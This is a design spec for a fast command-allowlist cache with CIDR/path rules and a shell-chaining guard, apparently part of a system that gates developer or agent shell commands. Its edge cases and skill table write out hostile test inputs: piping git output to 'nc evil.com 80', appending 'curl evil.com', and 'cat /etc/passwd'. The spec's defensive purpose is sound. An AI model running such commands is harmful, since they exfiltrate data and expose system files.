# PRD_02: `backend/tier0_cache.py` & `backend/picoclaw_cache.go`

**Target File(s)**: `backend/tier0_cache.py`, `backend/picoclaw_cache.go`
**Lane / role**: `lane1b` / Builder + Auditor   **Audit required**: yes
**Design reference**: Cloudflare Radar Sub-Millisecond Edge Cache & Sipeed PicoClaw Runtime [SOURCE: Dossier_01 p1]

## 1. Purpose and Role

Implements Step 2 of the PAROLE pipeline: the Tier 0 PicoClaw in-memory policy cache (`< 1.8 ms` [TARGET] p95 latency, `< 10 MB` [TARGET] RAM footprint, resolving $84\%$ [TARGET] of recurring developer traffic at $\$0.00$ [SOURCE: Dossier_01 p2] token cost). Evaluates commands that pass `kernel_guard.py` against pre-seeded safe developer command patterns and dynamically promoted CIDR subnet + path glob rules (such as `+ PERMIT 10.0.4.0/24 ON /api/v1/*`). Strictly rejects any command attempting shell chaining (`&&`, `||`, `;`, `|`, backticks, `$()`) so attackers cannot piggyback exfiltration onto a cached `git status` rule.

## 2. Bound Skills (Verified in `SKILLS_AVAILABLE.md`)

| Slash | Rule Pack if Skill is Missing | Why Here |
| :--- | :--- | :--- |
| `/super-mega-backend` | `RP-HOTPATH` | O(1) prefix lookup and pre-parsed `ipaddress.IPv4Network` matching under `1.8 ms` [TARGET] |
| `/mega-system-architecture` | `RP-CONTRACT`, `RP-HOTPATH` | Thread-safe hot-reload rule promotion from Tier 2 without server restart |
| `/adversarial-reviewer` | `RP-ADVERSARIAL`, `RP-SECURITY` | Shell-chaining guard preventing command smuggling (`git status && curl evil.com`) |

## 3. Specification

1. **Data and Constants**:
   - `DEFAULT_SAFE_PATTERNS: tuple[str, ...] = ("git status", "git diff*", "git log*", "git branch*", "git checkout*", "pytest*", "npm test*", "npm run test*", "npm run lint*", "eslint src/*", "cargo check*", "ls", "ls -la*", "ls -l*", "cat src/*")` [SOURCE: Dossier_01 p4]
   - `RULE_SYNTAX_REGEX`: parses `(?:\+\s*)?PERMIT\s+(\S+)\s+ON\s+(\S+)` into `(cidr_or_host, path_glob)`.
   - In-memory `_ACTIVE_CIDR_RULES: list[tuple[ipaddress._BaseNetwork, str, str]]` storing `(parsed_network, path_glob, raw_rule_str)` protected by a lightweight lock for hot-reload.

2. **Functions**:
   - `def has_shell_chaining(command: str) -> bool:` returns `True` if `command` contains any shell control or chaining operator (`&&`, `||`, `;`, `|`, `` ` ``, `$(`, `\n`, `\r`, `>`, `>>`).
   - `def extract_host_and_path(command: str) -> tuple[str | None, str | None]:` extracts the target IP/host and URL path from `curl`, `wget`, `http`, or `GET`/`POST` commands (for example `curl -s https://10.0.4.12/api/v1/users` -> `("10.0.4.12", "/api/v1/users")`).
   - `def match_tier0_cache(command: str) -> dict:` timed with `time.perf_counter_ns()`.
     1. Strips leading/trailing whitespace. If empty or `has_shell_chaining(command)` is `True`, immediately returns `{"hit": False, "matched_rule": None, "chained_rejected": True, "latency_ms": elapsed_ms}`.
     2. Checks `DEFAULT_SAFE_PATTERNS` via exact/prefix/fnmatch. If matched, returns `{"hit": True, "matched_rule": pattern, "chained_rejected": False, "latency_ms": elapsed_ms}`.
     3. Calls `extract_host_and_path(command)`. If `(host, path)` is present and `host` is a valid IP address inside any `(network, path_glob, raw_rule)` in `_ACTIVE_CIDR_RULES` and `fnmatch.fnmatch(path, path_glob)` is `True`, returns `{"hit": True, "matched_rule": raw_rule, "chained_rejected": False, "latency_ms": elapsed_ms}`.
     4. Otherwise returns `{"hit": False, "matched_rule": None, "chained_rejected": False, "latency_ms": elapsed_ms}`.
   - `def promote_scoped_rule(scoped_rule: str) -> dict:` validates `scoped_rule` against `RULE_SYNTAX_REGEX` (such as `"+ PERMIT 10.0.4.0/24 ON /api/v1/*"`), parses the CIDR network with `ipaddress.ip_network(cidr_str, strict=False)`, deduplicates and appends to `_ACTIVE_CIDR_RULES`, and returns `{"promoted": True, "rule": canonical_rule, "active_rule_count": len(get_active_rules()), "latency_ms": elapsed_ms}`.
   - `def get_active_rules() -> list[str]:` returns the list of pre-seeded rules plus all dynamically promoted CIDR/path rules.
   - `def reset_promoted_rules() -> None:` clears dynamically promoted rules back to the cold-start state for deterministic benchmark and demo runs.

3. **Edge Cases**:
   - Piggybacked shell chaining: `git status && curl https://10.0.4.99/api/v1/invoices`, `pytest; cat /etc/passwd`, `git log | nc evil.com 80` must all return `hit=False, chained_rejected=True`.
   - Subnet boundary checks: after promoting `+ PERMIT 10.0.4.0/24 ON /api/v1/*`, `10.0.4.12/api/v1/users` and `10.0.4.99/api/v1/orders` must hit (`hit=True`), whereas `10.0.5.12/api/v1/users` (wrong subnet) or `10.0.4.12/admin/delete` (wrong path) must miss (`hit=False`).
   - Duplicate rule promotion: promoting the same CIDR rule twice must be idempotent without duplicating entries.

4. **Failure Behaviour**:
   - `promote_scoped_rule` raises `ValueError` if `scoped_rule` does not match `PERMIT <valid_cidr> ON <path_glob>` or if `GRANT ALL` / `*:*` is passed.

5. **Budget**:
   - p95 `<= 1.8 ms` [TARGET] (`< 0.5 ms` [TARGET] typical in-process lookup).

## 4. Invariants

- Matches `00_MASTER_PRD.md` Sections 3 and 4 exactly.
- Writes only `backend/tier0_cache.py` and `backend/picoclaw_cache.go` (plus `requests/lane1b.md`).
- Pure-Python implementation in `backend/tier0_cache.py` operates with zero external dependencies so it never fails if Go is absent; `backend/picoclaw_cache.go` provides the standalone Go CLI/stdio companion cache.

## 5. Gates

```bash
python backend/tier0_cache.py
pytest -q tests/test_tier0_cache.py
python scripts/contract_lock.py check
python scripts/check_file_lock.py --since wave0-locked --allow "backend/tier0_cache.py" --allow "backend/picoclaw_cache.go" --allow "requests/lane1b.md"
```